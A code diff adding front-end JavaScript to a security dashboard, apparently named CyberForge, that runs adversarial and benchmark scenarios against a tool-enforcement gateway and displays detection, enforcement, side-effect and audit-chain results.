+            <span style="font-size:0.65rem; color:${sevColor}; font-weight:700; border:1px solid ${sevColor}; padding:1px 4px; border-radius:4px;">${s.severity}</span>
+          </div>
+          <div style="font-size:0.7rem; color:var(--text-secondary); margin-bottom:0.3rem;">${s.category.replace(/_/g, ' ')}</div>
+          <div style="font-size:0.68rem; color:var(--text-muted); text-overflow:ellipsis; overflow:hidden; white-space:nowrap;">Target Tool: <code>${s.intended_tool}</code></div>
+        </div>`;
+      }).join('');
+    }
+
+    function selectAdvScenarioById(id) {
+      const found = cyberforgeScenarios.find(s => s.id === id);
+      if (found) selectAdvScenario(found);
+    }
+
+    function selectAdvScenario(s) {
+      selectedAdvScenario = s;
+      renderScenariosList();
+      
+      document.getElementById('adv-selected-id').innerText = s.id;
+      document.getElementById('adv-selected-name').innerText = s.name;
+      document.getElementById('adv-selected-desc').innerText = s.description;
+      document.getElementById('adv-selected-prompt').innerText = s.prompt;
+      document.getElementById('adv-outcome-panel').style.display = 'none';
+    }
+
+    async function runCurrentScenario() {
+      if (!selectedAdvScenario) {
+        alert('Please select an attack scenario first.');
+        return;
+      }
+      const mode = document.getElementById('adv-exec-mode').value;
+      try {
+        const res = await fetch('/api/cyberforge/adversarial/run', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            scenario_id: selectedAdvScenario.id,
+            mode: mode
+          })
+        });
+        const outcome = await res.json();
+        
+        const panel = document.getElementById('adv-outcome-panel');
+        panel.style.display = 'flex';
+
+        const banner = document.getElementById('adv-outcome-banner');
+        if (outcome.security_outcome === 'ATTACK_BLOCKED_AND_PREVENTED' || outcome.security_outcome === 'POLICY_BLOCKED_EXECUTION') {
+          banner.style.background = 'rgba(16,185,129,0.2)';
+          banner.style.border = '1px solid var(--color-approve)';
+          banner.style.color = 'var(--color-approve)';
+          banner.innerText = '🛡️ ' + outcome.security_outcome.replace(/_/g, ' ');
+        } else if (outcome.security_outcome === 'LEGITIMATE_ACTION_PERMITTED') {
+          banner.style.background = 'rgba(99,102,241,0.2)';
+          banner.style.border = '1px solid var(--accent-indigo)';
+          banner.style.color = '#a5b4fc';
+          banner.innerText = '✓ ' + outcome.security_outcome.replace(/_/g, ' ');
+        } else {
+          banner.style.background = 'rgba(239,68,68,0.2)';
+          banner.style.border = '1px solid var(--color-reject)';
+          banner.style.color = 'var(--color-reject)';
+          banner.innerText = '🚨 ' + outcome.security_outcome.replace(/_/g, ' ');
+        }
+
+        const detElem = document.getElementById('adv-res-detected');
+        detElem.innerText = outcome.attack_detected ? 'DETECTED' : 'NOT DETECTED';
+        detElem.style.color = outcome.attack_detected ? 'var(--color-approve)' : 'var(--color-reject)';
+
+        const decElem = document.getElementById('adv-res-decision');
+        decElem.innerText = outcome.enforcement_decision;
+        decElem.style.color = outcome.enforcement_decision === 'ALLOW' ? 'var(--color-approve)' : (outcome.enforcement_decision === 'DENY' ? 'var(--color-reject)' : 'var(--color-modify)');
+
+        const seElem = document.getElementById('adv-res-sideeffects');
+        seElem.innerText = outcome.unauthorized_side_effect ? 'YES (UNAUTHORIZED)' : 'ZERO SIDE EFFECTS';
+        seElem.style.color = outcome.unauthorized_side_effect ? 'var(--color-reject)' : 'var(--color-approve)';
+
+        const traceElem = document.getElementById('adv-res-trace');
+        traceElem.innerHTML = (outcome.execution_trace || []).map(t => `<div>• ${t}</div>`).join('');
+      } catch (err) {
+        console.error('Error running adversarial test:', err);
+        alert('Test execution failed: ' + err.message);
+      }
+    }
+
+    // --- Benchmark Center ---
+    async function loadBenchmarkCenter() {
+      // Intentionally leave ready for test run or load default run
+    }
+
+    async function triggerBenchmarkExecution() {
+      const mode = document.getElementById('bm-mode-select').value;
+      const btn = document.querySelector('#tab-benchmark .btn-primary');
+      if (btn) btn.innerText = '⏳ Executing Suite (21 Scenarios)...';
+      try {
+        const res = await fetch('/api/cyberforge/benchmark/run', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ mode: mode })
+        });
+        const bm = await res.json();
+        currentBenchmarkRunId = bm.run_id;
+
+        // Enable Export Buttons
+        document.getElementById('bm-btn-csv').disabled = false;
+        document.getElementById('bm-btn-json').disabled = false;
+
+        // Update KPIs
+        const atkRate = (bm.metrics.attack_success_rate * 100).toFixed(1) + '%';
+        const unauthRate = (bm.metrics.unauthorized_action_rate * 100).toFixed(1) + '%';
+        const enfRate = (bm.metrics.enforcement_success_rate * 100).toFixed(1) + '%';
+        const fpRate = (bm.metrics.false_positive_rate * 100).toFixed(1) + '%';
+        const latVal = bm.metrics.median_latency_ms.toFixed(2) + ' ms';
+
+        const atkElem = document.getElementById('bm-metric-attack-rate');
+        atkElem.innerText = atkRate;
+        atkElem.style.color = bm.metrics.attack_success_rate > 0 ? 'var(--color-reject)' : 'var(--color-approve)';
+
+        const unauthElem = document.getElementById('bm-metric-unauth-rate');
+        unauthElem.innerText = unauthRate;
+        unauthElem.style.color = bm.metrics.unauthorized_action_rate > 0 ? 'var(--color-reject)' : 'var(--color-approve)';
+
+        document.getElementById('bm-metric-enforce-rate').innerText = enfRate;
+        document.getElementById('bm-metric-fp-rate').innerText = fpRate;
+        document.getElementById('bm-metric-latency').innerText = latVal;
+
+        // Update Category Breakdown
+        const catTbody = document.getElementById('bm-category-tbody');
+        if (catTbody && bm.category_metrics) {
+          catTbody.innerHTML = Object.entries(bm.category_metrics).map(([cat, m]) => `
+            <tr>
+              <td><strong>${cat.replace(/_/g, ' ')}</strong></td>
+              <td>${m.total}</td>
+              <td>${m.adversarial_count}</td>
+              <td style="color:${m.unauthorized_actions > 0 ? 'var(--color-reject)' : 'var(--color-approve)'}; font-weight:700;">${m.unauthorized_actions}</td>
+              <td style="color:${m.attack_success_rate > 0 ? 'var(--color-reject)' : 'var(--color-approve)'}; font-weight:700;">${(m.attack_success_rate * 100).toFixed(1)}%</td>
+              <td style="color:#a5b4fc; font-weight:700;">${(m.enforcement_rate * 100).toFixed(1)}%</td>
+            </tr>
+          `).join('');
+        }
+
+        // Update Scenario Details
+        const scnTbody = document.getElementById('bm-scenarios-tbody');
+        if (scnTbody && bm.results) {
+          scnTbody.innerHTML = bm.results.map(r => `
+            <tr>
+              <td><code style="color:var(--accent-indigo);">${r.scenario_id}</code></td>
+              <td>${r.scenario_name}</td>
+              <td><span style="font-size:0.7rem; color:var(--text-secondary);">${r.category}</span></td>
+              <td><span class="badge ${r.severity === 'CRITICAL' ? 'badge-reject' : 'badge-modify'}">${r.severity}</span></td>
+              <td>${r.is_adversarial ? '<span style="color:var(--color-reject); font-weight:600;">Adversarial</span>' : '<span style="color:var(--color-approve);">Benign</span>'}</td>
+              <td><span class="badge ${r.enforcement_decision === 'ALLOW' ? 'badge-approve' : (r.enforcement_decision === 'DENY' ? 'badge-reject' : 'badge-modify')}">${r.enforcement_decision}</span></td>
+              <td>${r.unauthorized_side_effect ? '<span style="color:var(--color-reject); font-weight:700;">⚠️ Yes</span>' : '<span style="color:var(--color-approve);">✓ None</span>'}</td>
+              <td><span style="font-size:0.7rem; color:#a5b4fc;">${r.security_outcome}</span></td>
+              <td style="color:var(--text-secondary);">${r.execution_latency_ms.toFixed(2)}ms</td>
+            </tr>
+          `).join('');
+        }
+      } catch (err) {
+        console.error('Error running benchmark:', err);
+        alert('Benchmark execution failed: ' + err.message);
+      } finally {
+        if (btn) btn.innerText = '🚀 Run Benchmark Suite';
+      }
+    }
+
+    function exportCurrentBenchmark(format) {
+      if (!currentBenchmarkRunId) {
+        alert('Please run a benchmark evaluation before exporting.');
+        return;
+      }
+      window.open(`/api/cyberforge/benchmark/export?run_id=${encodeURIComponent(currentBenchmarkRunId)}&format=${format}`, '_blank');
+    }
+
+    // --- Settings & Tools ---
+    async function loadCyberForgeSettings() {
+      const tbody = document.getElementById('settings-tools-tbody');
+      if (!tbody) return;
+      try {
+        const res = await fetch('/api/cyberforge/tools');
+        const tools = await res.json();
+        tbody.innerHTML = tools.map(t => `
+          <tr>
+            <td><code style="color:var(--accent-indigo); font-weight:700;">${t.tool_name}</code></td>
+            <td style="color:var(--text-secondary); font-size:0.72rem;">${t.description}</td>
+            <td>v${t.version}</td>
+            <td><span class="badge" style="background:rgba(99,102,241,0.2); color:#a5b4fc;">${t.required_role}</span></td>
+            <td><span class="badge badge-modify">${t.sensitivity_level}</span></td>
+            <td><code style="font-size:0.68rem; color:#94a3b8;">${t.allowed_targets.join(', ')}</code></td>
+            <td style="font-weight:700; color:${t.physical_side_effects_produced > 0 ? 'var(--color-approve)' : 'var(--text-muted)'};">${t.physical_side_effects_produced}</td>
+            <td><span class="badge badge-approve">GATEWAY ENFORCED</span></td>
+          </tr>
+        `).join('');
+
+        const vRes = await fetch('/api/cyberforge/audit/verify');
+        const vData = await vRes.json();
+        const statElem = document.getElementById('settings-audit-status');
+        if (statElem) {
+          if (vData.is_valid) {
+            statElem.innerText = `CHAIN FULLY VALID (${vData.verified_entries} BLOCKS)`;
+            statElem.style.color = 'var(--color-approve)';
+          } else {
+            statElem.innerText = `COMPROMISED AT INDEX ${vData.tampered_index}`;
+            statElem.style.color = 'var(--color-reject)';
+          }
+        }
+      } catch (err) {
+        console.error('Error loading settings:', err);
+      }
+    }
+
+    // --- Overview Telemetry ---
+    async function loadSecurityOverview() {
+      try {
+        const res = await fetch('/api/cyberforge/overview');
+        const data = await res.json();
+        if (data.gateway_summary) {
+          const evalElem = document.getElementById('m-evaluated');
+          if (evalElem) evalElem.innerText = data.gateway_summary.total_invocations || evalElem.innerText;
+          const appElem = document.getElementById('m-approved');
+          if (appElem) appElem.innerText = data.gateway_summary.allowed || appElem.innerText;
+          const blkElem = document.getElementById('m-blocked');
+          if (blkElem) blkElem.innerText = data.gateway_summary.denied || blkElem.innerText;
+        }
+      } catch (err) {
+        console.error('Error loading overview:', err);
       }
     }
 
